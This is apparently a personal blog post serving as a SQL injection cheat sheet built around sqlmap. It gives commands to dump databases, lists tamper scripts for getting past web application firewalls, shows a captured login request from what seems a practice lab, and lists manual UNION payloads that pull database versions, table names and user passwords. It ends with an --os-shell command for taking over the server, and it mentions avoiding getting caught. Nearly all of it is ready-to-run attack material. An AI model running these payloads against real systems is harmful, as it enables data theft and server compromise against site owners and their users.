---
layout: post
title: sqlmap
description: database killer 
date: 2022-04-09
---

```
sqlmap -r report.req --dbms=mysql --technique=U --dbms mysql --level 5 --risk 3 -p id --dump

-r is the file name
--dbms is the database type
--technique is the type - U is union
-p is the parameter, in this case the parameter that is vulnerable is id
--level checks everything, user agents, cookies, all parameters
--risk will blow up how much traffic you generate and might get you caught
```

#### sqlmap post params
See the request below? Add it to a text file and save whatever request you are attempting to exploit

then

select which parameter - in this parameter, the post requests you can check user, admin, and pass

so, if you wanna check user parameter, do this
```
sqlmap -r this-filename.txt -p user
```
or if you wanna check the pass field, do this
```
sqlmap -r this-filename.txt -p pass
```
Example
```
POST /?page=login HTTP/1.1
Host: 10.10.10.76

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.76/?page=login
Cookie: PHPSESSID=81uqq56dr9jb3o35qa2jdv0u61
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

user=admin&pass=admin&submit=Login
```
**********

### MySQL tampering
```
tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```
MSSQL tampering
```
tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
General Tampering
```
tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

* * *

```
sqlmap -u 'http://1.sqli.labs/' -p user-agent --random-agent --banner

sqlmap -r /root/Desktop/request.txt -p --user agent

sqlmap -u http://5.sqli.labs -p user-agent --random-agent --banner --tamper=randomcase,space2comment,apostrophemask,informationschemacomment
```

### Payloads
```
IP-address/cat.php?id=1 UNION SELECT 1,@@version,3,4--

IP-address/cat.php?id=1 UNION SELECT 1,database(),3,4--

IP-address/cat.php?id=1 UNION SELECT 1,current_user(),3,4--

IP-address/cat.php?id=1 UNION SELECT 1,@@datadir,3,4--

IP-address/cat.php?id=1 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--

IP-address/cat.php?id=1 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name="users"--

IP-address/cat.php?id=1 UNION SELECT 1,group_concat(id,0x3a,login,0x3a,password),3,4 FROM photoblog.users--
```

### Copy POST request from burp and run with it

`sqlmap -r request.txt --dbms=mysql --dump`

### sqlmap crawl

`sqlmap -u http://172.21.0.0 --crawl=1`

### sqlmap dump database

`sqlmap -u http://172.21.0.0 --dbms=mysql --dump`

### sqlmap shell

`sqlmap -u http://172.21.0.0 --dbms=mysql --os-shell`
